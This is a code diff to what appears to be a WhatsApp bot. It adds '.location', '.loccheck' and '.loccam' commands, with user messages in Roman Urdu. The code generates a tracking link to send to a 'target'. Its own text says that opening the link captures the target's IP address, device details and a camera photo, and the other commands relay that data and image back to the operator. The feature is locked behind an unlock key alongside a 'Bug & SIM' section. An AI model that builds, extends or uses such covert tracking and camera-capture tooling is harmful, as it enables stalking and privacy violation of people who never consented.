@@ -13491,6 +13491,159 @@ case 'removekey1': {
 }
 break;
 
+// ============ LOCATION TRACKER COMMAND (.location) ============
+case 'location':
+case 'loc':
+case 'tracker': {
+    // ── addkey1 lock — same as Bug & SIM section ──
+    {
+        const _locN = (m.sender || '').split('@')[0].split(':')[0];
+        try {
+            const _locBanned = (global._flagCache?.bugBanned || []);
+            if (_locBanned.some(id => String(id).replace(/[^0-9]/g,'') === _locN))
+                return reply(`🚫 *Access Denied*
+Aap is section se permanently ban hain.`);
+            const _locUnlocked = (global._flagCache?.bugUnlocked || []);
+            if (!_locUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _locN))
+                return reply(`🔒 *Location Tracker — Locked*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karo:* ${prefix}addkey1 <code>`);
+        } catch(e) {
+            return reply(`🔒 *Location Tracker — Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+        }
+    }
+
+    // ── Build session on the local API server ──
+    try {
+        const _locUserId  = m.sender;
+        const _locPort    = process.env.PORT || 3001;
+        const _locApiBase = `http://localhost:${_locPort}`;
+
+        const _locResp = await axios.post(`${_locApiBase}/api/location/start`, {
+            userId: _locUserId
+        }, { timeout: 8000 });
+
+        const _locToken = _locResp.data.sessionToken;
+        const _locLink  = _locResp.data.link;
+
+        if (!_locToken || !_locLink) throw new Error('Bad response from location server');
+
+        // Store token in message context so owner can check results later
+        // using .loccheck <token>
+        const _locMsg =
+            `🎯 *Location Tracker Link Generated!*\n\n` +
+            `*🔗 Link:*\n${_locLink}\n\n` +
+            `*📋 Token:* \`${_locToken}\`\n\n` +
+            `*📌 Kaise use karein:*\n` +
+            `1️⃣  Ye link target ko bhejo\n` +
+            `2️⃣  Jab wo link kholega — IP, device info aur camera capture ho jaye gi\n` +
+            `3️⃣  Results check karo: *${prefix}loccheck ${_locToken}*\n\n` +
+            `⏳ Link 2 ghante baad expire ho jata hai.`;
+
+        reply(_locMsg);
+
+    } catch (_locErr) {
+        console.error('[LOCATION] Error:', _locErr.message);
+        reply(`❌ *Error generating tracking link.*\nServer se connection nahi ho saka.\nThodi der baad dobara try karo.`);
+    }
+    break;
+}
+
+// ── .loccheck <token> — fetch captured data ──────────────────────────
+case 'loccheck':
+case 'locresult': {
+    // ── addkey1 lock ──
+    {
+        const _lcN = (m.sender || '').split('@')[0].split(':')[0];
+        try {
+            const _lcBanned = (global._flagCache?.bugBanned || []);
+            if (_lcBanned.some(id => String(id).replace(/[^0-9]/g,'') === _lcN))
+                return reply(`🚫 *Access Denied*`);
+            const _lcUnlocked = (global._flagCache?.bugUnlocked || []);
+            if (!_lcUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _lcN))
+                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+    }
+
+    const _lcToken = text?.trim();
+    if (!_lcToken) return reply(`🔑 *Usage:* ${prefix}loccheck <token>\n\nToken aapko ${prefix}location command mein mila tha.`);
+
+    try {
+        const _lcPort    = process.env.PORT || 3001;
+        const _lcApiBase = `http://localhost:${_lcPort}`;
+
+        const _lcResp = await axios.get(`${_lcApiBase}/api/location/result/${_lcToken}`, { timeout: 8000 });
+        const d       = _lcResp.data;
+
+        if (!d || d.error) return reply(`❌ *Session not found.*\nToken galat hai ya 2 ghante se zyada purana hai.`);
+
+        const _lcMet = d.metrics || {};
+        const _lcConn = _lcMet.connection ? `${_lcMet.connection.type} (${_lcMet.connection.downlink} Mbps)` : 'N/A';
+        const _lcTime = d.timestamp ? new Date(d.timestamp).toLocaleString('en-PK', { timeZone: 'Asia/Karachi' }) : 'N/A';
+
+        const _lcReport =
+            `📊 *Location Tracker — Results*\n\n` +
+            `👤 *User ID:* ${d.userId || 'N/A'}\n` +
+            `🌐 *IP Address:* ${d.ip || '⏳ Not yet visited'}\n` +
+            `📱 *Device:* ${_lcMet.userAgent ? _lcMet.userAgent.substring(0, 80) + '…' : 'N/A'}\n` +
+            `💻 *Platform:* ${_lcMet.platform || 'N/A'}\n` +
+            `🌍 *TimeZone:* ${_lcMet.timeZone || 'N/A'}\n` +
+            `📡 *Connection:* ${_lcConn}\n` +
+            `🖥️ *Screen:* ${_lcMet.viewport ? `${_lcMet.viewport.width}×${_lcMet.viewport.height}` : 'N/A'}\n` +
+            `📸 *Camera:* ${d.hasCamera ? '✅ Captured!' : '❌ Not captured yet'}\n` +
+            `🕒 *Last Seen:* ${_lcTime}\n\n` +
+            `${d.hasCamera ? `📷 Camera image dekhne ke liye:\n*${prefix}loccam ${_lcToken}*` : ''}`;
+
+        reply(_lcReport);
+
+    } catch (_lcErr) {
+        console.error('[LOCCHECK] Error:', _lcErr.message);
+        reply(`❌ *Error fetching results.*\nServer se connection nahi ho saka.`);
+    }
+    break;
+}
+
+// ── .loccam <token> — fetch camera image ────────────────────────────
+case 'loccam': {
+    // ── addkey1 lock ──
+    {
+        const _lcamN = (m.sender || '').split('@')[0].split(':')[0];
+        try {
+            const _lcamBanned = (global._flagCache?.bugBanned || []);
+            if (_lcamBanned.some(id => String(id).replace(/[^0-9]/g,'') === _lcamN))
+                return reply(`🚫 *Access Denied*`);
+            const _lcamUnlocked = (global._flagCache?.bugUnlocked || []);
+            if (!_lcamUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _lcamN))
+                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+    }
+
+    const _lcamToken = text?.trim();
+    if (!_lcamToken) return reply(`🔑 *Usage:* ${prefix}loccam <token>`);
+
+    try {
+        const _lcamPort = process.env.PORT || 3001;
+        const _lcamBase = `http://localhost:${_lcamPort}`;
+        const _lcamResp = await axios.get(`${_lcamBase}/api/location/camera/${_lcamToken}`, { timeout: 10000 });
+
+        const _lcamImg = _lcamResp.data?.image;
+        if (!_lcamImg) return reply(`⏳ *Camera image abhi tak nahi aayi.*\nThodi der baad dobara try karo.`);
+
+        // Convert base64 to buffer and send as image
+        const _lcamB64  = _lcamImg.replace(/^data:image\/jpeg;base64,/, '').replace(/^data:image\/png;base64,/, '');
+        const _lcamBuf  = Buffer.from(_lcamB64, 'base64');
+
+        await sock.sendMessage(m.chat, {
+            image  : _lcamBuf,
+            caption: `📸 *Camera Capture*\nToken: \`${_lcamToken}\``
+        }, { quoted: m });
+
+    } catch (_lcamErr) {
+        console.error('[LOCCAM] Error:', _lcamErr.message);
+        if (_lcamErr.response?.status === 204) return reply(`⏳ *Camera image abhi tak nahi aayi.*`);
+        reply(`❌ *Error fetching camera image.*`);
+    }
+    break;
+}
+
 // ============ ANTIDELETE COMMAND ============
 case 'antidelete':
 case 'antidel':
